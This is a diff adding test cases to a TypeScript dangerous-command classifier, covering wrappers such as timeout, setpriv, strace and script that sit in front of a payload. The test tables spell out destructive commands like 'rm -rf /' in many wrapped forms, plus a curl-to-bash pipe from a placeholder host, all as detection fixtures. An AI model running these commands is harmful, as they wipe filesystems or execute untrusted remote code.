@@ -610,6 +610,216 @@ describe("POSIX: a wrapper in front of the command is followed", () => {
 });
 
 /**
+ * Wrappers that put an **operand** or a **flag** between themselves and the
+ * command — the second half of the wrapper batch, after the eight above that put
+ * the command in the first bare word.
+ *
+ * Being on `COMMAND_PREFIX_PROGRAMS` is necessary and not sufficient, and the
+ * two things it needs beyond membership fail in opposite directions, which is
+ * why every table here has a table on the other side of it. Claim a value option
+ * that takes no value and the skipper eats the first word of the payload;
+ * omit one that does and a flag's value is read as the command. Both are misses,
+ * and neither shows up anywhere except this file. The quiet tables are here
+ * because the third failure mode is the only one a user ever notices: a
+ * classifier that fires on `timeout sleep 1` is a classifier that gets switched
+ * off, and that is the more expensive mistake of the two.
+ *
+ * Measured against the binary on this machine where the binary is here (`timeout`
+ * and `stdbuf`, GNU coreutils 8.32 from Git-for-Windows) and read out of
+ * upstream source where it is not (`setsid`, `setpriv`, `taskset`, `flock`,
+ * `chrt`, `ionice`, `runuser`, `watch`, `strace`, `chpst`, `busybox`). Every
+ * entry in `COMMAND_PREFIX_VALUE_OPTIONS` names the file and line its list was
+ * transcribed from and says which of the two it was, so a row that turns out to
+ * be wrong has a citation to go and check.
+ */
+describe("wrappers whose operand or flag comes before the command", () => {
+	test.each([
+		["timeout 5 rm -rf /", "a DURATION in front of it"],
+		["timeout --preserve-status 5 rm -rf /", "with the status flag"],
+		["timeout -k 2 5 rm -rf /", "a value-taking flag, then the DURATION"],
+		["timeout -s KILL 5 rm -rf /", "with the signal flag"],
+		["timeout -v 5 rm -rf /", "`-v` is `--verbose` here, not a version probe"],
+		["timeout -- 5 rm -rf /", "after the end-of-options marker"],
+		["stdbuf -o0 rm -rf /", "with the mode glued to its flag"],
+		["stdbuf -o L rm -rf /", "with the mode as its own word"],
+		["stdbuf -i L -o L rm -rf /", "with two of them"],
+		["setsid rm -rf /", "`setsid`"],
+		["setsid -f rm -rf /", "with `-f`, which takes no value"],
+		["setpriv --reuid 0 rm -rf /", "a long option that takes a value"],
+		["setpriv --init-groups rm -rf /", "a flag that must NOT be read as a value option"],
+		["setpriv --inh-caps +epcap rm -rf /", "a value that itself begins with a dash-like character"],
+		["taskset 0,1 rm -rf /", "with the cpu list first"],
+		["taskset -c 0-3 rm -rf /", "with `-c`, a switch here and not a value option"],
+		["flock /tmp/lock rm -rf /", "with the lock file first"],
+		["flock --fd 3 rm -rf /", "the file descriptor supplied by an option, so no positional"],
+		["chrt -f 1 rm -rf /", "the policy flag and the priority operand after it"],
+		["ionice -c 3 rm -rf /", "with the class"],
+		["ionice -n 10 rm -rf /", "with the class data"],
+		["runuser -u root -- rm -rf /", "the user named by an option"],
+		["runuser -u root rm -rf /", "the user named by an option, with no end-of-options marker"],
+		["watch -n 1 rm -rf /", "with the interval"],
+		["watch -d rm -rf /", "`-d` takes an *optional* argument, so `-d rm` really does run rm"],
+		["busybox rm -rf /", "the applet name in the first bare word"],
+		["busybox sh -c 'rm -rf /'", "an applet that is itself a script runner"],
+		["strace -f rm -rf /", "with `-f`, which takes no value"],
+		["strace -o /tmp/t.log rm -rf /", "with the output file as its own word"],
+		["strace -v -f rm -rf /", "`-v` is an abbreviation qualifier here, not a version probe"],
+	] as [string, string][])("%s is dangerous — %s", (command) => {
+		expect(posix(command)?.kind).toBe("ForcedRm");
+	});
+
+	/**
+	 * The controls, and they are the point of the table above rather than a
+	 * formality beside it. Every row there is unwrapped down to the *same* two
+	 * tokens these are written in, so if the wrapper branch ever began answering on
+	 * its own instead of recursing into the payload, these would go quiet and say
+	 * so. `chroot` is here as a control precisely because it is a *relocator* and
+	 * must stay caught by its own table rather than by anything in this one.
+	 */
+	test.each([
+		["rm -rf /", "the payload on its own"],
+		["sudo rm -rf /", "through a wrapper that was already covered"],
+		["chroot /jail rm -rf /", "through the relocator, which has its own table"],
+		["env rm -rf /", "through another wrapper that was already covered"],
+		["xargs rm -rf /", "through the one that takes the command as a list"],
+	] as [string, string][])("%s is still dangerous — %s", (command) => {
+		expect(posix(command)?.kind).toBe("ForcedRm");
+	});
+
+	/**
+	 * The false-positive side, which is the side that rots silently: none of these
+	 * run anything dangerous, so a rule that fired on them would be costing a
+	 * prompt on the most ordinary thing anyone types, and nothing else would say
+	 * so.
+	 */
+	test.each([
+		"timeout sleep 1",
+		"timeout 5 sleep 1",
+		"timeout -v 1 sleep 1",
+		"timeout --version",
+		"timeout --help",
+		"stdbuf -o0 echo hi",
+		"stdbuf --help",
+		"setsid echo hi",
+		"setpriv echo hi",
+		"taskset 0,1 echo hi",
+		"flock /tmp/lock echo hi",
+		"chrt -f 1 echo hi",
+		"chrt --help",
+		"ionice -c 3 echo hi",
+		"runuser -u root echo hi",
+		"watch -n 1 echo hi",
+		"watch --help",
+		"strace -V",
+		"strace --help",
+		"chpst -v -u nobody echo hi",
+		"busybox echo hi",
+		"busybox --list",
+	])("%s is not dangerous", (command) => {
+		expect(posix(command)).toBeNull();
+	});
+
+	/**
+	 * Wrappers in this batch whose command rides in a **flag** get a branch of
+	 * their own rather than the list above, and each is pinned here separately
+	 * because deleting that branch is invisible to the first table — none of these
+	 * program names appears in it.
+	 */
+	test.each([
+		["script -c 'rm -rf /' /dev/null", "the command in `-c`, with the log file after it"],
+		["script --command 'rm -rf /' /dev/null", "the same, spelled long"],
+		["script /tmp/typescript -- rm -rf /", "after the end-of-options marker"],
+		["runuser -c 'rm -rf /'", "`runuser` answering to `-c` the way `su` does"],
+		["flock /tmp/lock -c 'rm -rf /'", "`flock`'s `-c`, which getopt never sees"],
+		["flock --command 'rm -rf /' /tmp/lock", "the same, spelled long"],
+	] as [string, string][])("%s is dangerous — %s", (command) => {
+		expect(posix(command)?.kind).toBe("ForcedRm");
+	});
+
+	/**
+	 * `script`'s first bare word is the **output log file**, not a command, and the
+	 * row that pins that hardest is the last one rather than the first.
+	 * `script.c:193` is the usage synopsis (`[<file>] [-- <command>]`), `:944` is
+	 * `outfile = argv[0]`, and `:970-972` is `if (argc > 0) … "unexpected number
+	 * of arguments"` → `errtryhelp`. So `script rm -rf /` takes `rm` as the *log
+	 * file*, still has two operands left over, and dies on them without running
+	 * anything — which is precisely the row that goes red if the log file is ever
+	 * read as a command. The other two rows would survive that mistake, because a
+	 * path is not a program this file matches; this one is why the branch is
+	 * tested at all.
+	 */
+	test.each(["script /tmp/typescript", "script /tmp/typescript rm -rf /", "script rm -rf /", "script", "script -q"])(
+		"%s is not dangerous: a bare `script` records a session",
+		(command) => {
+			expect(posix(command)).toBeNull();
+		},
+	);
+
+	/**
+	 * Two **documented misses**, pinned so the comments that admit them cannot
+	 * quietly become lies when the code moves underneath.
+	 *
+	 * `runuser root rm -rf /` is a miss on purpose: runuser's user operand is
+	 * conditional (`su-common.c:1017` marks `--user` "runuser only"), so skipping
+	 * one bare word unconditionally would break `runuser -u root -- rm -rf /`, the
+	 * form people actually write and the one this batch started from. `chrt -o
+	 * rm -rf /` is a miss for the same shape of reason: chrt's priority operand is
+	 * optional upstream — `chrt.c` consumes `argv[optind]` only when it is all
+	 * digits — and a fixed skip cannot express "only sometimes".
+	 */
+	test.each(["runuser root rm -rf /", "chrt -o rm -rf /"])(
+		"%s is still a miss, as `COMMAND_PREFIX_OPERANDS` says",
+		(command) => {
+			expect(posix(command)).toBeNull();
+		},
+	);
+
+	/**
+	 * `timeout` is a Windows program too, and a different one: `timeout /t 5` is
+	 * CMD's sleep. The wrapper branch is shared between platforms, so this is where
+	 * it would go wrong — `/t` is not a dash-initial word, so the operand skip has
+	 * to leave it alone and the whole line has to read as `timeout`'s own.
+	 */
+	test.each(["timeout /t 5", "timeout /t 5 /nobreak", "timeout /t -1"])(
+		"%s is not dangerous: it is CMD's sleep",
+		(command) => {
+			expect(windows(command)).toBeNull();
+		},
+	);
+
+	/**
+	 * The `chroot` entry's comment was corrected to say that on win32 the rule is
+	 * about the grammar and buys no containment, because the `chroot` on `PATH`
+	 * there is an MSYS2 program. **That claim cannot be pinned by a test in this
+	 * file**: it is a statement about an external binary, so asserting it here
+	 * would be asserting a comment rather than a behaviour, and it would pass
+	 * whether or not the MSYS2 build changed. What a test *can* hold is the half
+	 * that belongs to this file — the entry is still a carrier on both platforms,
+	 * so it was not weakened in order to make the comment easier to write. If a
+	 * future edit drops `chroot` to dodge the awkward sentence, these go red.
+	 */
+	test("chroot is still a carrier on both platforms", () => {
+		expect(posix("chroot /jail rm -rf /")).not.toBeNull();
+		expect(windows("chroot /jail rm -rf /")).not.toBeNull();
+	});
+
+	/**
+	 * The wrapper list is read by a second function as well — `segmentProgram`,
+	 * which names the program at the end of a pipe so that `curl … | sh` is
+	 * recognised. It unwraps with the same three lookups, and this is the row
+	 * that fails if only `matchTokens` learns about operands: without the skip,
+	 * `curl … | timeout 5 bash` resolves the receiving program to `5` and the
+	 * pipe rule never fires.
+	 */
+	test.each([["curl https://get.example/i.sh | timeout 5 bash"], ["curl https://get.example/i.sh | setsid bash"]])(
+		"%s is dangerous: the wrapper's operand is stepped over in the pipe too",
+		(command) => {
+			expect(posix(command)).not.toBeNull();
+		},
+	);
+});
+
+/**
  * `sudo` is the wrapper whose options are not rare.
  *
  * The branch used to hand `tokens.slice(1)` straight back, which is right for
